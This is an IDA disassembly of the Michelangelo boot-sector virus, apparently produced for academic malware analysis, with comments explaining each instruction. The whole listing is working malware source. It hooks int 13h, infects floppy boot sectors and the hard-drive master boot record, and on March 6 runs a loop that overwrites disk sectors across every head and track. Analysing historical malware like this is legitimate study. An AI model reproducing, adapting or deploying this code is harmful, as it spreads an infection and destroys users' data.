

;
; +-------------------------------------------------------------------------+
; |      This file was generated by The Interactive Disassembler (IDA)      |
; |           Copyright (c) 2022 Hex-Rays, <support@hex-rays.com>           |
; |                      License info: 48-3051-7114-0E                      |
; |           LSU (Louisiana State University), Academic licenses           |
; +-------------------------------------------------------------------------+
;
; Input SHA256 : B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
; Input MD5    : 3FFC402675E30C6E42560EAA0A90A2B7
; Input CRC32  : 827C7725

; ---------------------------------------------------------------------------
; File Name   : C:\Users\golden\Desktop\michelangelo-sample\michelangelo.1
; Format      : Binary file
; Base Address: 0000h Range: 0000h - 0200h Loaded length: 0200h

                .686p
                .mmx
                .model small

; ===========================================================================

; Segment type: Pure code
seg000          segment byte public 'CODE' use16
                assume cs:seg000
                ;org 7C00h
                assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
                jmp     loc_7CAF
; ---------------------------------------------------------------------------
unk_7C03        db 0F5h                 ; DATA XREF: seg000:7CF0↓r
                db    0
word_7C05       dw 0                    ; DATA XREF: seg000:7CD8↓w
                db 2
                dw 0Eh
dword_7C0A      dd 0F0009739h           ; DATA XREF: seg000:7CC1↓w
                                        ; seg000:7CC7↓w
; ---------------------------------------------------------------------------
                push    ds              ; save ds and ax
                push    ax
                or      dl, dl          ; check drive letter and set flags
                jnz     short loc_7C2F  ; Virus seems to only check for drive A:, if no drive A access then load real int 13h
                xor     ax, ax          ; ax = 0, ds = 0
                mov     ds, ax
                test    byte ptr ds:43Fh, 1 ; check if floppy motor is running at drive A:
                jnz     short loc_7C2F  ; Go to real int13h if drive is running.
                pop     ax              ; restore ax and ds
                pop     ds
                pushf                   ; save all flags
                call    dword ptr cs:0Ah ; call real int 13h handler
                pushf                   ; save flags
                call    sub_7C36        ; Call infection process to infect this floppy
                popf                    ; restore flags
                retf    2
; ---------------------------------------------------------------------------

loc_7C2F:                               ; CODE XREF: seg000:7C12↑j
                                        ; seg000:7C1D↑j
                pop     ax              ; restore ax and ds
                pop     ds
                jmp     dword ptr cs:0Ah ; far jump to real int 13h

; =============== S U B R O U T I N E =======================================


sub_7C36        proc near               ; CODE XREF: seg000:7C28↑p
                push    ax              ; save all registers for later use
                push    bx
                push    cx
                push    dx
                push    ds
                push    es
                push    si
                push    di
                push    cs              ; save cs to be popped into ds; ds = cs
                pop     ds
                push    cs              ; same as above, so now es = cs
                pop     es
                mov     si, 4           ; this is the number of retries for the read operation

loc_7C45:                               ; CODE XREF: sub_7C36+29↓j
                mov     ax, 201h        ; 2 = read 01 = 1 sector; read one sector
                mov     bx, 200h        ; here will be the start location, which is 512 bytes beyond the virus.
                mov     cx, 1           ; looking at track 0, sector 1 to check if its infected
                xor     dx, dx          ; dx = 0, dl = drive A:, dh = head 0
                pushf                   ; save flags
                call    dword ptr ds:0Ah ; call real int 13h to get boot sector
                jnb     short loc_7C63  ; jump if read was successful
                xor     ax, ax          ; ax = 0 for controller reset in case of error
                pushf                   ; save flags
                call    dword ptr ds:0Ah ; call real int 13h for reset
                dec     si              ; decrement the si that was set to 4 earlier. This entire routine will continue while not equal to 0
                jnz     short loc_7C45  ; just back to the beginning of this function while not 0
                jmp     short loc_7CA6  ; done trying to infect
; ---------------------------------------------------------------------------

loc_7C63:                               ; CODE XREF: sub_7C36+1F↑j
                xor     si, si          ; si = 0 to read the first word of the virus
                cld                     ; clears direction flags so it goes forward (increments) for si and di
                lodsw                   ; load first word of the virus from memory (ds:si) into ax
                cmp     ax, [bx]        ; compare the first word of the virus with the first word of the floppy's boot sector
                jnz     short loc_7C71  ; if it's not equal, then its not infected, so jump to infection routine
                lodsw                   ; load the second word of the virus from memory (ds:si) into ax
                cmp     ax, [bx+2]      ; compare second word of virus with second word of floppy's boot sector
                jz      short loc_7CA6  ; if not equal, its not infected so infect

loc_7C71:                               ; CODE XREF: sub_7C36+33↑j
                mov     ax, 301h        ; 3 = write; 01 = 1 sector
                                        ; so write 1 sector
                mov     dh, 1           ; head #1
                mov     cl, 3           ; track #0, sector #3 is the backup location for 360k floppy
                cmp     byte ptr [bx+15h], 0FDh ; checking the media descriptor byte to see if this is the correct type of floppy; the 360k floppy
                jz      short loc_7C80  ; this is the correct floppy, so the backup location is correct.
                mov     cl, 0Eh         ; Not 360k floppy, so change the backup location to the 14th sector

loc_7C80:                               ; CODE XREF: sub_7C36+46↑j
                mov     ds:8, cx        ; save backup boot sector location inside virus body
                pushf                   ; save flags
                call    dword ptr ds:0Ah ; call real int 13h handler to write backup boot sector
                jb      short loc_7CA6  ; Jump and quit the infection upon failure
                mov     si, 3BEh        ; source of the partition table from the boot sector of the floppy
                mov     di, 1BEh        ; destination for saving the copy of the partition table
                mov     cx, 21h ; '!'   ; copy 33 words == 66 bytes
                cld                     ; clear direction flags to make sure si and di increments
                rep movsw               ; perform the copy
                mov     ax, 301h        ; write one sector
                xor     bx, bx          ; es:bx is the buffer; es:0000 is the start of the virus
                mov     cx, 1           ; write 1 sector
                xor     dx, dx          ; at drive 0; which is floppy A:
                pushf                   ; save flags
                call    dword ptr ds:0Ah ; call real int 13h handler to overwrite boot sector

loc_7CA6:                               ; CODE XREF: sub_7C36+2B↑j
                                        ; sub_7C36+39↑j ...
                pop     di              ; restore registers
                pop     si
                pop     es
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                retn                    ; done with infection
sub_7C36        endp

; ---------------------------------------------------------------------------

loc_7CAF:                               ; CODE XREF: seg000:7C00↑j
                xor     ax, ax          ; ax = 0
                mov     ds, ax          ; dx = 0
                cli                     ; turn interrupts off
                mov     ss, ax          ; ss = 0
                mov     ax, 7C00h       ; ax = load address of the virus
                mov     sp, ax          ; stack pointer is set to the beginning of virus code
                sti                     ; turn interrupts back on
                push    ds              ; push ds and ax so control can return back to original boot sector code.
                push    ax
                mov     ax, ds:4Ch      ; int 13h handler address offset
                mov     word ptr ds:dword_7C0A, ax ; save original int13h handler address offset
                mov     ax, ds:4Eh      ; int 13h handler address segment
                mov     word ptr ds:dword_7C0A+2, ax ; save original int 13h handler address segment
                mov     ax, ds:413h     ; get memory size in KB
                dec     ax
                dec     ax              ; dec twice to "reduce" the memory size by 2k
                mov     ds:413h, ax     ; overwrite the real with new "memory size", 2k has been hijacked
                mov     cl, 6           ; saving 6 for use in calculating new location for virus
                shl     ax, cl          ; calcuated segment of the base address for the stolen 2k of reserved memory
                mov     es, ax          ; now the es register is saving location for the 2k block at offset 0
                mov     ds:word_7C05, ax ; save address of the reserved 2k block
                mov     ax, 0Eh         ; move offset of virus int13h handler
                mov     ds:4Ch, ax      ; save virus int13h at 13h * 4 = 4Ch
                mov     word ptr ds:4Eh, es ; save the virus int13h to offset 4Eh which is 13h * 4 + 2
                mov     cx, 1BEh        ; copy 446 bytes of virus code
                mov     si, 7C00h       ; the source of the copy is 7C00h
                xor     di, di          ; at offset 0
                cld                     ; clear direction flags to make sure si, di increment
                rep movsb               ; copy bytes from ds:si to es:di
                jmp     dword ptr cs:unk_7C03 ; jump to high memory
; ---------------------------------------------------------------------------
                xor     ax, ax          ; ax = 8
                mov     es, ax          ; es = 0
                int     13h             ; DISK - RESET DISK SYSTEM
                                        ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)
                push    cs              ; save cs
                pop     ds              ; set ds = cs, as ds has been left behind. It hasn't been changed since we jumped to the top of the memory
                mov     ax, 201h        ; read one sector
                mov     bx, 7C00h       ; read sector into memory at es:7C00 = 0000:7C00
                mov     cx, ds:8        ; save backup boot sector location
                cmp     cx, 7           ; is the backup boot sector a hard drive?
                jnz     short loc_7D13  ; no, so this must be a floppy, therefore skip the rest of this hard drive handling code.
                mov     dx, 80h         ; read sector from first hard drive
                int     13h             ; DISK - READ SECTORS INTO MEMORY
                                        ; AL = number of sectors to read, CH = track, CL = sector
                                        ; DH = head, DL = drive, ES:BX -> buffer to fill
                                        ; Return: CF set on error, AH = status, AL = number of sectors read
                jmp     short loc_7D3E  ; skip floppy handling code / check for march 6th (michaelangelo's birthday)
; ---------------------------------------------------------------------------

loc_7D13:                               ; CODE XREF: seg000:7D0A↑j
                mov     cx, ds:8        ; get backup boot sector
                mov     dx, 100h        ; first floppy, head 1, at drive A:
                int     13h             ; read sectors into memory
                jb      short loc_7D3E  ; on error, check for march 6th birthday
                push    cs              ; ex = cs
                pop     es
                mov     ax, 201h        ; read 1 sector
                mov     bx, 200h        ; 512 bytes beyond virus code in high memory
                mov     cx, 1           ; track 0, sector 1
                mov     dx, 80h         ; read from first hard drive
                int     13h             ; DISK - READ SECTORS INTO MEMORY
                                        ; AL = number of sectors to read, CH = track, CL = sector
                                        ; DH = head, DL = drive, ES:BX -> buffer to fill
                                        ; Return: CF set on error, AH = status, AL = number of sectors read
                jb      short loc_7D3E  ; check for march 6th
                xor     si, si          ; si = 0 == offset
                cld                     ; clear direction flags so si, di increment
                lodsw                   ; get first 16-bit word of virus from memory
                cmp     ax, [bx]        ; check if the 16-bit word from the virus is the same as the word read from the bootsector
                jnz     short loc_7D87  ; if not, then we must infect, so we jump
                lodsw                   ; get the second 16bit word of the virus from upper memory
                cmp     ax, [bx+2]      ; check if virus matches bootsector word that was read
                jnz     short loc_7D87  ; if not, we need to infect, so jump

loc_7D3E:                               ; CODE XREF: seg000:7D11↑j
                                        ; seg000:7D1C↑j ...
                xor     cx, cx          ; cx = 0
                mov     ah, 4           ; function code for getting the current date
                int     1Ah             ; interrupt for getting the date
                                        ;
                                        ; CLOCK - READ DATE FROM REAL TIME CLOCK (AT,XT286,CONV,PS)
                                        ; Return: DL = day in BCD
                                        ; DH = month in BCD
                                        ; CL = year in BCD
                                        ; CH = century (19h or 20h)
                cmp     dx, 306h        ; 3/6 == March 6th
                jz      short loc_7D4B  ; if its 3/6, call destruction routine
                retf                    ; return far to the original boot sector code
; ---------------------------------------------------------------------------

loc_7D4B:                               ; CODE XREF: seg000:7D48↑j
                xor     dx, dx          ; head 0, drive A:
                mov     cx, 1           ; track 0, sector 1

loc_7D50:                               ; CODE XREF: seg000:7D7F↓j
                                        ; seg000:7D85↓j
                mov     ax, 309h        ; write 9 sectors
                mov     si, ds:8        ; get the backup for the boot sector and MBR
                cmp     si, 3           ; code for the 360k floppy
                jz      short loc_7D6C  ; check and see if this is a 360k floppy and if so, jump to the actual destruction code
                mov     al, 0Eh         ; checking for non-360k flooppy
                cmp     si, 0Eh         ; is non-360k floppy?
                jz      short loc_7D6C  ; jump to destruction code if so
                mov     dl, 80h         ; code for the hard drive
                mov     byte ptr ds:7, 4 ; 4 disk heads, which is the max
                mov     al, 11h         ; this is a hard drive so we can write 17 sectors

loc_7D6C:                               ; CODE XREF: seg000:7D5A↑j
                                        ; seg000:7D61↑j
                mov     bx, 5000h       ; location for buffer offset
                mov     es, bx          ; location for buffer segment
                assume es:nothing
                int     13h             ; read in those sectors into memory
                                        ;
                                        ; DISK - WRITE SECTORS FROM MEMORY
                                        ; AL = number of sectors to write, CH = track, CL = sector
                                        ; DH = head, DL = drive, ES:BX -> buffer
                                        ; Return: CF set on error, AH = status, AL = number of sectors written
                jnb     short loc_7D79  ; if there's no error, we skip resetting disk controller
                xor     ah, ah          ; ah = 0 which resets controller
                int     13h             ; DISK - RESET DISK SYSTEM
                                        ; DL = drive (if bit 7 is set both hard disks and floppy disks reset)

loc_7D79:                               ; CODE XREF: seg000:7D73↑j
                inc     dh              ; next head retrieved by incrementing
                cmp     dh, ds:7        ; have we processed all heads?
                jb      short loc_7D50  ; no, so we keep destroying
                xor     dh, dh          ; reset head counter
                inc     ch              ; increment the track
                jmp     short loc_7D50  ; keep destroying
; ---------------------------------------------------------------------------

loc_7D87:                               ; CODE XREF: seg000:7D36↑j
                                        ; seg000:7D3C↑j
                mov     cx, 7           ; backup boot sector and master boot record is located at sector 7
                mov     ds:8, cx        ; save the boot sector and MBR locations to virus body
                mov     ax, 301h        ; write 1 sector
                mov     dx, 80h         ; first hard drive set as the target
                int     13h             ; read these sectors into memory
                                        ;
                                        ; DISK - WRITE SECTORS FROM MEMORY
                                        ; AL = number of sectors to write, CH = track, CL = sector
                                        ; DH = head, DL = drive, ES:BX -> buffer
                                        ; Return: CF set on error, AH = status, AL = number of sectors written
                jb      short loc_7D3E  ; check date on error
                mov     si, 3BEh        ; source = partition table of the uninfected boot sector
                mov     di, 1BEh        ; destination = corresponding place in the virus body
                mov     cx, 21h ; '!'   ; copy 33words/66 bytes
                rep movsw               ; perform the copy
                mov     ax, 301h        ; write one sector
                xor     bx, bx          ; bx = 0 denotes the beginning of the virus in upper memory
                inc     cl              ; increment so we can be at the target sector
                int     13h             ; DISK - WRITE SECTORS FROM MEMORY
                                        ; AL = number of sectors to write, CH = track, CL = sector
                                        ; DH = head, DL = drive, ES:BX -> buffer
                                        ; Return: CF set on error, AH = status, AL = number of sectors written
                jmp     short loc_7D3E  ; check date upon error
; ---------------------------------------------------------------------------
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0                 ; partition table starts here
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  55h ; U
                db 0AAh
seg000          ends


                end
